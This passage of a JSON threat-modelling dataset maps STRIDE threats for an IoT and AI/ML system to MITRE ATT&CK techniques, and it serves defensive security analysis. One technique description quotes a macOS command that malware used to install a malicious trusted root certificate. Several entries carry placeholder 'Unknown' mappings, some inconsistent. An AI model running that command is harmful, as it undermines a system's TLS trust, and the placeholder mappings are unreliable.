permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a vulnerability in the AI/ML algorithm to execute commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The AI/ML algorithm has exploitable vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Unpatched or flawed algorithm"
                },
                {
                    "Assumption": "The attacker can influence input data to the AI/ML system.",
                    "Role": "Attacker",
                    "Condition": "Control over input data"
                },
                {
                    "Assumption": "There are no safeguards to prevent malicious command execution through AI/ML systems.",
                    "Role": "System Designer",
                    "Condition": "Lack of safeguarding measures"
                }
            ],
            "Potential Impact": "Unauthorized administrative control and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "AI/ML exploitation",
                "command execution",
                "algorithm vulnerability",
                "elevated privileges"
            ],
            "mitre_technique": {
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
                "technique_id": "T1202"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Unauthorized users can spoof biometric inputs to gain access to the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "Adversary has access to a user's biometric data.",
                    "Role": "Adversary",
                    "Condition": "User\u2019s biometric data is obtainable through other means, such as social engineering or compromised devices."
                },
                {
                    "Assumption": "Biometric sensor lacks anti-spoofing mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Sensor does not employ advanced anti-spoofing algorithms."
                },
                {
                    "Assumption": "The system does not re-authenticate users periodically.",
                    "Role": "System Administrator",
                    "Condition": "System relies solely on initial biometric scan without further checks."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, compromise of system integrity.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "credential access",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers spoof network identities to intercept communication within the IoT environment.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure components lack mutual authentication.",
                    "Role": "Network Architect",
                    "Condition": "Components do not verify each other's identity before data exchange."
                },
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Data is transmitted in plaintext over the network."
                },
                {
                    "Assumption": "Adversary has physical or remote access to network devices.",
                    "Role": "Adversary",
                    "Condition": "Adversary can access network points to inject spoofed identities."
                }
            ],
            "Potential Impact": "Interception and tampering of data, leading to potential confidentiality and integrity breaches.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network spoofing",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofing smart cards or hardware tokens used for authentication to gain access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can clone or fabricate smart cards.",
                    "Role": "Adversary",
                    "Condition": "Smart cards are not protected against cloning."
                },
                {
                    "Assumption": "Hardware tokens do not use rolling codes or OTP mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Tokens generate static codes for authentication."
                },
                {
                    "Assumption": "Authentication logs are not actively monitored.",
                    "Role": "System Administrator",
                    "Condition": "Unusual authentication attempts are not flagged or investigated."
                }
            ],
            "Potential Impact": "Gain unauthorized access, potential data breaches, and misuse of system functionalities.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "token cloning",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker physically tampers with sensors to alter data input.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has physical access to sensors.",
                    "Role": "Adversary",
                    "Condition": "Sensors are located in easily accessible areas."
                },
                {
                    "Assumption": "Tamper-detection mechanisms are not implemented.",
                    "Role": "System Designer",
                    "Condition": "Sensors lack mechanisms to detect physical alterations."
                },
                {
                    "Assumption": "System relies on sensor data without cross-verification.",
                    "Role": "System Administrator",
                    "Condition": "There are no redundant sensors or validation checks for data discrepancies."
                }
            ],
            "Potential Impact": "Altered environmental data leads to incorrect system actions, affecting data integrity and operational reliability.",
            "MITRE ATT&CK Keywords": [
                "physical tampering",
                "sensor manipulation",
                "input alteration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infects actuators to perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Actuators are not secured against unauthorized firmware updates.",
                    "Role": "System Designer",
                    "Condition": "Firmware updates can be initiated without validation."
                },
                {
                    "Assumption": "Network security controls are inadequate to prevent malware spread.",
                    "Role": "Network Administrator",
                    "Condition": "Malware can move laterally across the network."
                },
                {
                    "Assumption": "Actuator logs are not regularly reviewed for anomalies.",
                    "Role": "System Administrator",
                    "Condition": "Irregular behaviors are not detected in real-time."
                }
            ],
            "Potential Impact": "Actuators perform harmful actions, compromising system integrity and user safety.",
            "MITRE ATT&CK Keywords": [
                "malware injection",
                "device tampering",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Database tampering to alter or delete user data and system configurations.",
            "Assumptions": [
                {
                    "Assumption": "Database lacks encryption and robust access controls.",
                    "Role": "Database Administrator",
                    "Condition": "Database contents are accessible to unauthorized users."
                },
                {
                    "Assumption": "Regular integrity checks are not performed., ",
                    "Role": "Unknown",
                    "Condition": "Unknown"
                },
                {
                    "Assumption": "Backups are not adequately maintained or tested.",
                    "Role": "System Administrator",
                    "Condition": "Backup restoration processes are unreliable or non-existent."
                }
            ],
            "Potential Impact": "Loss of data integrity and availability, potentially corrupting personalized services and historical data analysis.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "data manipulation",
                "record alteration"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unauthorized access to system actions without proper logging, allowing malicious actors to deny involvement.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not capture all user actions.",
                    "Role": "System Designer",
                    "Condition": "Logs are not comprehensive or are improperly configured."
                },
                {
                    "Assumption": "Logs are not securely stored or protected from tampering.",
                    "Role": "System Administrator",
                    "Condition": "Log files can be altered or deleted."
                },
                {
                    "Assumption": "There is no regular log review process in place.",
                    "Role": "System Administrator",
                    "Condition": "Logs are not monitored for suspicious activities."
                }
            ],
            "Potential Impact": "Lack of accountability, enabling malicious activities without trace, impacting system integrity and forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "action repudiation",
                "log manipulation",
                "evidence tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Inadequate non-repudiation controls allow users to deny actions or transactions performed in the system.",
            "Assumptions": [
                {
                    "Assumption": "System does not enforce strong authentication and digital signatures.",
                    "Role": "System Designer",
                    "Condition": "Actions are not bound to user identity through cryptographic means."
                },
                {
                    "Assumption": "Audit trails are incomplete or missing crucial information.",
                    "Role": "System Designer",
                    "Condition": "Recorded logs are insufficient to track user actions."
                },
                {
                    "Assumption": "Users have shared credentials or weak passwords.",
                    "Role": "System Administrator",
                    "Condition": "Credential management is poorly enforced."
                }
            ],
            "Potential Impact": "Users may deny legitimate actions, affecting system integrity and accountability in legal or internal investigations.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation failure",
                "action denial",
                "transaction forgery"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Tampers with communication logs to erase traces of a breach.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not protected by integrity checks.",
                    "Role": "System Administrator",
                    "Condition": "Logs lack mechanisms to detect alterations."
                },
                {
                    "Assumption": "Log storage lacks proper security controls.",
                    "Role": "System Administrator",
                    "Condition": "Log files are not encrypted or access-controlled."
                },
                {
                    "Assumption": "There is no real-time monitoring of log integrity.",
                    "Role": "Security Team",
                    "Condition": "Altered logs are not promptly detected."
                }
            ],
            "Potential Impact": "Loss of crucial forensic evidence, hampering breach investigation and future preventive measures.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "evidence destruction",
                "tampering evidence"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Intercepting unencrypted data transmission between sensors and the central system.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission lacks encryption.",
                    "Role": "System Designer",
                    "Condition": "Data is sent in plaintext over the network."
                },
                {
                    "Assumption": "Network monitoring tools are insufficient.",
                    "Role": "Network Administrator",
                    "Condition": "No tools are in place to detect unauthorized interceptions."
                },
                {
                    "Assumption": "Sensitive data is transmitted without segmentation or protection.",
                    "Role": "System Designer",
                    "Condition": "All data, including sensitive ones, are transmitted the same way."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, impacting confidentiality and potentially leading to further attacks.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network eavesdropping",
                "information theft"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--e63b3f36-5ae5-450f-ae0c-b67f6740ef4d",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud data repositories storing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud repositories are not protected by strong authentication mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Weak access controls on cloud data repositories."
                },
                {
                    "Assumption": "Data is not encrypted at rest.",
                    "Role": "System Designer",
                    "Condition": "Stored data lacks encryption."
                },
                {
                    "Assumption": "Audit trails for cloud access are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Access logs are poorly maintained or reviewed."
                }
            ],
            "Potential Impact": "Exposure of sensitive user data, historical records, and system configurations, affecting user privacy and system confidentiality.",
            "MITRE ATT&CK Keywords": [
                "cloud data breach",
                "unauthorized access",
                "sensitive data exposure"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised user devices leaking personal data.",
            "Assumptions": [
                {
                    "Assumption": "User devices do not have robust security controls.",
                    "Role": "Device Owner",
                    "Condition": "Devices lack adequate security measures such as encryption and strong passwords."
                },
                {
                    "Assumption": "Personal data is stored locally without protection.",
                    "Role": "Device Owner",
                    "Condition": "Data is stored without encryption or access controls."
                },
                {
                    "Assumption": "Anti-malware tools are not installed.",
                    "Role": "Device Owner",
                    "Condition": "Devices are not protected against malware infections."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of personal data, compromising user privacy and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "data leak",
                "user data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on communication infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks DDoS protection mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "No DDoS mitigation tools or services are in place."
                },
                {
                    "Assumption": "Monitoring tools do not detect abnormal traffic patterns.",
                    "Role": "Network Security",
                    "Condition": "Network traffic is not continuously monitored."
                },
                {
                    "Assumption": "Infrastructure scalability is limited.",
                    "Role": "System Architect",
                    "Condition": "System cannot handle traffic spikes effectively."
                }
            ],
            "Potential Impact": "Disruption of data exchange and coordination, impacting system availability and user experience.",
            "MITRE ATT&CK Keywords": [
                "distributed denial of service",
                "network flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware attack on IoT devices causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Devices lack anti-malware protections.",
                    "Role": "Device Manufacturer",
                    "Condition": "Firmware or software on devices does not include anti-malware capabilities."
                },
                {
                    "Assumption": "Endpoints are not monitored or managed securely.",
                    "Role": "Device Owner",
                    "Condition": "Endpoints do not receive regular security updates or monitoring."
                },
                {
                    "Assumption": "Network isolation is not enforced.",
                    "Role": "Network Administrator",
                    "Condition": "Infected devices can interact freely with other network components."
                }
            ],
            "Potential Impact": "Device downtime leading to loss of functionality and potential data loss, affecting system availability and reliability.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "endpoint compromise",
                "service downtime"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of zero-day vulnerabilities in components causing system crashes.",
            "Assumptions": [
                {
                    "Assumption": "System components are not regularly updated.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities are not patched promptly."
                },
                {
                    "Assumption": "Critical zero-day vulnerability is present and exploitable.",
                    "Role": "Vulnerability Researcher",
                    "Condition": "Unpatched zero-day exists in the system."
                },
                {
                    "Assumption": "Exploit mitigation techniques are not implemented.",
                    "Role": "System Designer",
                    "Condition": "System lacks security hardening measures."
                }
            ],
            "Potential Impact": "System crashes leading to downtime, affecting availability and service continuity.",
            "MITRE ATT&CK Keywords": [
                "zero-day exploit",
                "system crash",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting software bugs to gain higher privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "Software contains misconfigurations or unpatched bugs.",
                    "Role": "System Administrator",
                    "Condition": "Software maintenance is inadequate."
                },
                {
                    "Assumption": "Adversary has access to execute code on the system.",
                    "Role": "Adversary",
                    "Condition": "Initial access has already been gained through other means."
                },
                {
                    "Assumption": "System does not enforce least privilege principle.",
                    "Role": "System Designer",
                    "Condition": "Users have more privileges than necessary for their tasks."
                }
            ],
            "Potential Impact": "Unauthorized actions impacting system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "software exploit",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Credential theft leading to unauthorized access to administrative functions.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not stored or managed securely.",
                    "Role": "System Administrator",
                    "Condition": "Credentials are not encrypted or securely stored."
                },
                {
                    "Assumption": "Users reuse passwords across different systems.",
                    "Role": "User",
                    "Condition": "Same password used for multiple services."
                },
                {
                    "Assumption": "Multi-factor authentication is not enforced.",
                    "Role": "System Designer",
                    "Condition": "System does not require additional authentication factors."
                }
            ],
            "Potential Impact": "Unauthorized access to administration functions, leading to potential data breaches or system misconfigurations.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "administrative access",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders exploiting system flaws to gain unauthorized privileges.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have knowledge of system architecture and flaws.",
                    "Role": "Insider",
                    "Condition": "Insiders possess detailed information about the system."
                },
                {
                    "Assumption": "Access controls are not strict enough to prevent misuse.",
                    "Role": "System Designer",
                    "Condition": "Access policies are lenient and not properly enforced."
                },
                {
                    "Assumption": "Security controls do not detect privilege misuse.",
                    "Role": "Security Team",
                    "Condition": "Monitoring tools fail to detect abnormal privilege escalations."
                }
            ],
            "Potential Impact": "Insiders can execute unauthorized actions, compromising system safety and functionality.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "system flaw exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses fake biometric data to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "Biometric data can be intercepted and replicated.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to biometric data."
                },
                {
                    "Assumption": "Biometric sensors are not equipped with anti-spoofing mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Current system implementation lacks anti-spoofing measures."
                }
            ],
            "Potential Impact": "Unauthorized access to user-sensitive data and control over system actuators.",
            "MITRE ATT&CK Keywords": [
                "biometric",
                "spoofing",
                "access control",
                "fake data"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate user's smart card to log into the system.",
            "Assumptions": [
